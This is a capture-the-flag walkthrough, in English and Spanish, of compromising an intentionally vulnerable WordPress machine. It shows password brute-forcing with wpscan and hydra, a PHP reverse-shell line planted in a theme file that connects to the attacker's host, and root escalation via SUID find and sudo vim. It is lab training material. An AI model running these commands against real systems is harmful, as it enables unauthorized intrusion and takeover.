---
An easy level machine with multiple ways to escalate privileges.
---

###  boot2Root

﻿﻿Can you get access and get both **flags**?

Good Luck!.﻿

  
**Doubts and / or help in twitter**: [**@martinfriasc**](https://twitter.com/martinfriasc) or [**@ColddSecurity**](https://twitter.com/ColddSecurity)  
  

_Thumbnail box image credits, designed by [Freepik](https://www.flaticon.com/authors/freepik) from [www.flaticon.es](https://www.flaticon.es/)_  

Answer the questions below


```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.95.155 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.95.155:80
Open 10.10.95.155:4512
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-26 11:20 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:20
Completed NSE at 11:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:20
Completed NSE at 11:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:20
Completed NSE at 11:20, 0.00s elapsed
Initiating Ping Scan at 11:20
Scanning 10.10.95.155 [2 ports]
Completed Ping Scan at 11:20, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:20
Completed Parallel DNS resolution of 1 host. at 11:20, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:20
Scanning 10.10.95.155 [2 ports]
Discovered open port 80/tcp on 10.10.95.155
Discovered open port 4512/tcp on 10.10.95.155
Completed Connect Scan at 11:20, 0.19s elapsed (2 total ports)
Initiating Service scan at 11:20
Scanning 2 services on 10.10.95.155
Completed Service scan at 11:20, 6.70s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.95.155.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:20
Completed NSE at 11:21, 5.96s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:21
Completed NSE at 11:21, 0.78s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:21
Completed NSE at 11:21, 0.00s elapsed
Nmap scan report for 10.10.95.155
Host is up, received conn-refused (0.19s latency).
Scanned at 2022-12-26 11:20:49 EST for 14s

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: ColddBox | One more machine
|_http-generator: WordPress 4.1.31
4512/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4ebf98c09bc536808c96e8969565973b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDngxJmUFBAeIIIjZkorYEp5ImIX0SOOFtRVgperpxbcxDAosq1rJ6DhWxJyyGo3M+Fx2koAgzkE2d4f2DTGB8sY1NJP1sYOeNphh8c55Psw3Rq4xytY5u1abq6su2a1Dp15zE7kGuROaq2qFot8iGYBVLMMPFB/BRmwBk07zrn8nKPa3yotvuJpERZVKKiSQrLBW87nkPhPzNv5hdRUUFvImigYb4hXTyUveipQ/oji5rIxdHMNKiWwrVO864RekaVPdwnSIfEtVevj1XU/RmG4miIbsy2A7jRU034J8NEI7akDB+lZmdnOIFkfX+qcHKxsoahesXziWw9uBospyhB
|   256 8817f1a844f7f8062fd34f733298c7c5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKNmVtaTpgUhzxZL3VKgWKq6TDNebAFSbQNy5QxllUb4Gg6URGSWnBOuIzfMAoJPWzOhbRHAHfGCqaAryf81+Z8=
|   256 f2fc6c750820b1b2512d94d694d7514f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE/fNq/6XnAxR13/jPT28jLWFlqxd+RKSbEgujEaCjEc
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:21
Completed NSE at 11:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:21
Completed NSE at 11:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:21
Completed NSE at 11:21, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.50 seconds

┌──(kali㉿kali)-[~]
└─$ wpscan --url http://10.10.95.155 -e u                                              
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.95.155/ [10.10.95.155]
[+] Started: Mon Dec 26 11:23:27 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.95.155/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.95.155/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.95.155/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.95.155/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.10.95.155/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.95.155/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.10.95.155/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.3
 | Style URL: http://10.10.95.155/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.95.155/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <=============================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Dec 26 11:23:49 2022
[+] Requests Done: 59
[+] Cached Requests: 6
[+] Data Sent: 14.338 KB
[+] Data Received: 264.84 KB
[+] Memory used: 166.965 MB
[+] Elapsed time: 00:00:22


c0ldd, hugo, philip

┌──(kali㉿kali)-[~]
└─$ wpscan --url http://10.10.95.155 -e ap
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.95.155/ [10.10.95.155]
[+] Started: Mon Dec 26 11:24:38 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.95.155/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.95.155/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.95.155/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.95.155/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.10.95.155/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.95.155/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.10.95.155/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.3
 | Style URL: http://10.10.95.155/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.95.155/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Dec 26 11:24:47 2022
[+] Requests Done: 2
[+] Cached Requests: 34
[+] Data Sent: 596 B
[+] Data Received: 1.027 KB
[+] Memory used: 248.68 MB
[+] Elapsed time: 00:00:09


bruteforce

┌──(kali㉿kali)-[~]
└─$ cat cold_users         
c0ldd
hugo
philip

┌──(kali㉿kali)-[~]
└─$ wpscan -U cold_users -P /usr/share/wordlists/rockyou.txt --url http://10.10.95.155
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.95.155/ [10.10.95.155]
[+] Started: Mon Dec 26 11:27:57 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.95.155/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.95.155/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.95.155/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.95.155/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.10.95.155/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.95.155/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.10.95.155/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.3
 | Style URL: http://10.10.95.155/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.95.155/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:08 <============================> (137 / 137) 100.00% Time: 00:00:08

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 3 user/s
[SUCCESS] - c0ldd / 9876543210                                                                             
^Cying hugo / chocolate1 Time: 00:08:01 <                         > (4160 / 43034400)  0.00%  ETA: ??:??:??
[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210

[!] No WPScan API Token given, as a result vulnerability data has not been output.00)  0.00%  ETA: ??:??:??
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Dec 26 11:36:28 2022
[+] Requests Done: 4306
[+] Cached Requests: 36
[+] Data Sent: 1.38 MB
[+] Data Received: 15.305 MB
[+] Memory used: 300.328 MB
[+] Elapsed time: 00:08:30

Scan Aborted: Canceled by User


8 minutes

c0ldd:9876543210

another way using hydra

just go to 10.10.95.155/wp-admin, then test with a user and pass, then inspect network, request. 
and see the form data

┌──(kali㉿kali)-[~]
└─$ hydra -L cold_users -P /usr/share/wordlists/rockyou.txt 10.10.95.155 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+in&testcookie=1:S=Location'
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-26 11:42:10
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 43033197 login tries (l:3/p:14344399), ~2689575 tries per task
[DATA] attacking http-post-form://10.10.95.155:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+in&testcookie=1:S=Location

[80][http-post-form] host: 10.10.95.155   login: c0ldd   password: 9876543210

https://forum.portswigger.net/thread/can-t-add-large-wordlists-to-burp-pro-intruder-3950f659

another way can be burp intruder, not Intruder isn't really designed to such large wordlists. It's intended as an interactive application, where you'll be manually working with the results. For really large wordlists you're generally better using dedicated brute force software like Hydra.

cz to load is 8.745.094 to load and will crash 

yep it works, but instead use like this.
log=c0ldd&pwd=§test§&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.95.155%2Fwp-admin%2F&testcookie=1

and in payload, payload type: runtime file (/usr/share/wordlists/rockyou.txt)
and search for length (948 Ok ) and (3863 wrong) (last 10 seconds to give the right pass :) )

hugp and philip cannot found just use c0ldd to login



webshell

or can be using weevely https://www.kali.org/tools/weevely/

Weevely is a stealth PHP web shell that simulate telnet-like connection. It is an essential tool for web application post exploitation, and can be used as stealth backdoor or as a web shell to manage legit web accounts, even free hosted ones.

https://istillknowkungfu.com/Shells/Webshells/#wordpress

go to appearance -> editor then upload it and save.

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.19.103/1337 0>&1'")
?>


┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 1337                                 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337

go to 
http://10.10.95.155/wp-content/themes/twentyfifteen/404.php

and get revshell

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 1337                                 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.95.155.
Ncat: Connection from 10.10.95.155:50300.
bash: cannot set terminal process group (1331): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ whoami
whoami
www-data
www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ export TERM=xterm
</www/html/wp-content/themes/twentyfifteen$ export TERM=xterm                
www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ export SHELL=bash
LL=bashSHE 
www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ which python3
on3ch pyth 
/usr/bin/python3
www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ python3 -c 'import pty;pty.spawn("/bin/bash")'
 'import pty;pty.spawn("/bin/bash")'
www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ 

www-data@ColddBox-Easy:/var/www/html$ ls
ls
hidden           wp-blog-header.php    wp-includes        wp-signup.php
index.php        wp-comments-post.php  wp-links-opml.php  wp-trackback.php
license.txt      wp-config-sample.php  wp-load.php        xmlrpc.php
readme.html      wp-config.php         wp-login.php
wp-activate.php  wp-content            wp-mail.php
wp-admin         wp-cron.php           wp-settings.php
www-data@ColddBox-Easy:/var/www/html$ cat hidden
cat hidden
cat: hidden: Is a directory
www-data@ColddBox-Easy:/var/www/html$ cd hidden
cd hidden
www-data@ColddBox-Easy:/var/www/html/hidden$ ls
ls
index.html
www-data@ColddBox-Easy:/var/www/html/hidden$ cat index.html
cat index.html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv=”Content-Type” content=”text/html; charset=UTF-8″ />
<title>Hidden Place</title>
</head>
<body>
<div align="center">
<h1>U-R-G-E-N-T</h1>
<h2>C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip</h2>
</div>
</body>
</html> 

www-data@ColddBox-Easy:/var/www/html/hidden$ find / -type f -name user.txt 2>/dev/null
v/null -type f -name user.txt 2>/de 
/home/c0ldd/user.txt
www-data@ColddBox-Easy:/var/www/html/hidden$ cd /home/c0ldd
cd /home/c0ldd
www-data@ColddBox-Easy:/home/c0ldd$ ls
ls
user.txt
www-data@ColddBox-Easy:/home/c0ldd$ cat user.txt
cat user.txt
cat: user.txt: Permission denied

www-data@ColddBox-Easy:/home/c0ldd$ find / -perm -4000 -type f 2>/dev/null | xargs ls -lah
gs ls -lahrm -4000 -type f 2>/dev/null | xar 
-rwsr-xr-x 1 root   root        31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root   root        40K Jan 27  2020 /bin/mount
-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root   root        40K Mar 26  2019 /bin/su
-rwsr-xr-x 1 root   root        27K Jan 27  2020 /bin/umount
-rwsr-sr-x 1 daemon daemon      51K Jan 14  2016 /usr/bin/at
-rwsr-xr-x 1 root   root        71K Mar 26  2019 /usr/bin/chfn
-rwsr-xr-x 1 root   root        40K Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root   root       217K Feb  8  2016 /usr/bin/find
-rwsr-xr-x 1 root   root        74K Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root        33K Mar 26  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root        39K Mar 26  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root   root        33K Mar 26  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root        53K Mar 26  2019 /usr/bin/passwd
-rwsr-xr-x 1 root   root        23K Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root   root       134K Jan 31  2020 /usr/bin/sudo
-rwsr-xr-- 1 root   messagebus  42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root        10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root       419K May 27  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root        15K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root       109K Jul 10  2020 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root        83K Apr  9  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

https://gtfobins.github.io/gtfobins/find/

www-data@ColddBox-Easy:/home/c0ldd$ /usr/bin/find . -exec /bin/sh -p \; -quit
/usr/bin/find . -exec /bin/sh -p \; -quit
# whoami
whoami
root
# ls
ls
user.txt
# cat user.txt
cat user.txt
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
# cat /root/root.txt
cat /root/root.txt
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=

another way

www-data@ColddBox-Easy:/home/c0ldd$ cd /var/www/html
cd /var/www/html
www-data@ColddBox-Easy:/var/www/html$ ls
ls
hidden           wp-blog-header.php    wp-includes        wp-signup.php
index.php        wp-comments-post.php  wp-links-opml.php  wp-trackback.php
license.txt      wp-config-sample.php  wp-load.php        xmlrpc.php
readme.html      wp-config.php         wp-login.php
wp-activate.php  wp-content            wp-mail.php
wp-admin         wp-cron.php           wp-settings.php
www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'o[eR&,8+wPcLpZaE<ftDw!{,@U:p]_hc5L44E]Q/wgW,M==DB$dUdl_K1,XL/+4{');
define('SECURE_AUTH_KEY',  'utpu7}u9|FEi+3`RXVI+eam@@vV8c8x-ZdJ-e,mD<6L6FK)2GS }^:6[3*sN1f+2');
define('LOGGED_IN_KEY',    '9y<{{<I-m4$q-`4U5k|zUk/O}HX dPj~Q)<>#7yl+z#rU60L|Nm-&5uPPB(;^Za+');
define('NONCE_KEY',        'ZpGm$3g}3+qQU_i0E<MX_&;B_3-!Z=/:bqy$&[&7u^sjS!O:Yw;D.|$F9S4(&@M?');
define('AUTH_SALT',        'rk&S:6Wls0|nqYoCBEJls`FY(NhbeZ73&|1i&Zach?nbqCm|CgR0mmt&=gOjM[.|');
define('SECURE_AUTH_SALT', 'X:-ta$lAW|mQA+,)/0rW|3iuptU}v0fj[L^H6v|gFu}qHf4euH9|Y]:OnP|pC/~e');
define('LOGGED_IN_SALT',   'B9%hQAayJt:RVe+3yfx/H+:gF/#&.+`Q0c{y~xn?:a|sX5p(QV5si-,yBp|FEEPG');
define('NONCE_SALT',       '3/,|<&-`H)yC6U[oy{`9O7k)q4hj8x/)Qu_5D/JQ$-)r^~8l$CNTHz^i]HN-%w-g');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');

define('WP_HOME', '/');
define('WP_SITEURL', '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

c0ldd : cybersecurity

www-data@ColddBox-Easy:/var/www/html$ su c0ldd
su c0ldd
Password: cybersecurity

c0ldd@ColddBox-Easy:/var/www/html$ cat /home/c0ldd/user.txt
cat /home/c0ldd/user.txt
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
c0ldd@ColddBox-Easy:/var/www/html$ sudo -l
sudo -l
[sudo] password for c0ldd: cybersecurity

Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp

three different ways 

c0ldd@ColddBox-Easy:/var/www/html$ sudo vim -c ':!/bin/sh'
sudo vim -c ':!/bin/sh'

# whoami
whoami
root

"sudo chmod -R 755 /root" es un comando de Linux que se utiliza para cambiar los permisos de acceso de un directorio o archivo. La opción "-R" indica que se deben cambiar los permisos recursivamente para todos los archivos y subdirectorios en el directorio especificado. En este caso, el directorio especificado es "/root", que es el directorio principal del usuario root en Linux.

Los permisos de acceso controlan quién puede acceder a un archivo o directorio y qué tipo de acceso pueden tener. Los permisos se dividen en tres categorías: propietario, grupo y otros. Los permisos se representan con números octales, y cada número octal representa un conjunto de permisos.

El número "755" es un número octal que se utiliza a menudo para establecer permisos de acceso para archivos y directorios. Los permisos establecidos por "755" son:

-   7: permisos de lectura, escritura y ejecución para el propietario
-   5: permisos de lectura y ejecución para el grupo
-   5: permisos de lectura y ejecución para otros

